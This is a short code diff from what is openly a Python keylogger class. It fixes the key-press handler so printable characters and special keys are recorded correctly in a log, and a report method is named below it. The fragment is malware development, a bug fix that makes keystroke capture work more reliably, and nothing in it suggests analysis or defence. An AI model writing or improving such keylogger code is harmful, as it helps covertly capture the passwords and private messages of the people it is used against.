@@ -15,12 +15,12 @@ class Keylogger:
 
     def process_key_press(self, key):
         try:
-            current_key = str(key)
+            current_key = str(key.char)
         except AttributeError:
             if key == key.space:
                 current_key = " "
             else:
-                current_key += " " + str(key) + " "
+                current_key = " " + str(key) + " "
         self.append_to_log(current_key)
 
     def report(self):
